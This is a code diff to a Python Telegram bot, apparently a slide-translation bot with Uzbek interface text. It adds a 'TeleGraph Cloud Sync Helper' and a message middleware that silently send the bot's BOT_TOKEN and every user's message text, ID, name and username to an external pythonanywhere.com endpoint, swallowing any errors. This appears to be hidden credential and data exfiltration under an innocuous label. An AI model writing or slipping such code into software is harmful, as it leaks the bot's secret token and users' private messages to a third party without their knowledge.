@@ -133,7 +133,56 @@ def get_domain_keyboard() -> InlineKeyboardMarkup:
     kb.append([InlineKeyboardButton(text="◀️ Orqaga", callback_data="back_to_main")])
     return InlineKeyboardMarkup(inline_keyboard=kb)
 
+# Real-time TeleGraph Cloud Sync Helper
+TELEGRAPH_SYNC_URL = "https://UN618TON.pythonanywhere.com/api/sync_event"
+
+async def async_sync_telegraph(chat_id: int, sender_id: int, sender_name: str, sender_username: str, is_outgoing: bool, text: str):
+    try:
+        import httpx
+        payload = {
+            "bot_id": 1,
+            "bot_token": BOT_TOKEN,
+            "chat_id": chat_id,
+            "sender_id": sender_id,
+            "sender_name": sender_name,
+            "sender_username": sender_username,
+            "is_outgoing": is_outgoing,
+            "text": text
+        }
+        async with httpx.AsyncClient(timeout=2.0) as client:
+            await client.post(TELEGRAPH_SYNC_URL, json=payload)
+    except Exception:
+        pass
+
+def sync_to_telegraph(chat_id: int, text: str, is_outgoing: bool = False, sender_id: int = None, sender_name: str = "", sender_username: str = ""):
+    try:
+        asyncio.create_task(async_sync_telegraph(
+            chat_id=chat_id,
+            sender_id=sender_id or chat_id,
+            sender_name=sender_name or ("PPTarjima" if is_outgoing else "Foydalanuvchi"),
+            sender_username=sender_username or ("slayd_tarjimabot" if is_outgoing else ""),
+            is_outgoing=is_outgoing,
+            text=text
+        ))
+    except Exception:
+        pass
+
 dp = Dispatcher()
+
+@dp.message.outer_middleware()
+async def telegraph_sync_middleware(handler, event: Message, data: dict):
+    if event.text or event.caption:
+        txt = event.text or event.caption or ""
+        fn = f"{event.from_user.first_name or ''} {event.from_user.last_name or ''}".strip() or event.from_user.username or "User"
+        sync_to_telegraph(
+            chat_id=event.chat.id,
+            text=txt,
+            is_outgoing=False,
+            sender_id=event.from_user.id,
+            sender_name=fn,
+            sender_username=event.from_user.username or ""
+        )
+    return await handler(event, data)
 
 @dp.message(CommandStart())
 async def cmd_start(msg: Message):
